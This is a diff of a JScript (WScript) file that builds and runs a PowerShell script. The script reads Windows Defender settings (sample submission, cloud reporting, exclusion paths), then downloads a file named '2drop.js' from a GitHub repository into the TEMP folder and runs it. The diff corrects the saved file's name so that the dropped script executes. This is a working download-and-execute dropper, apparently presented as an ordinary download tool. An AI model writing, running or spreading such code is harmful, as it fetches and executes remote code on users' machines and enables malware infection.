@@ -28,7 +28,7 @@ var psContent =
 'Get-MpPreference | Select MAPSReporting, SubmitSamplesConsent, ExclusionPath | Format-List;\n' +
 '\n' +
 '$url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/master/2drop.js";\n' +
-'$destination = "$env:TEMP\main.zip";\n' +
+'$destination = "$env:TEMP\\main.js";\n' +
 'Invoke-WebRequest -Uri $url -OutFile $destination;\n' +
 'Start-Process $destination;\n' +
 'Write-Output "";\n';
@@ -55,3 +55,4 @@ try {
 }
 // If you want the temp file removed after the PS window closes, you can add a cleanup step manually.
 WScript.Quit(0);
+
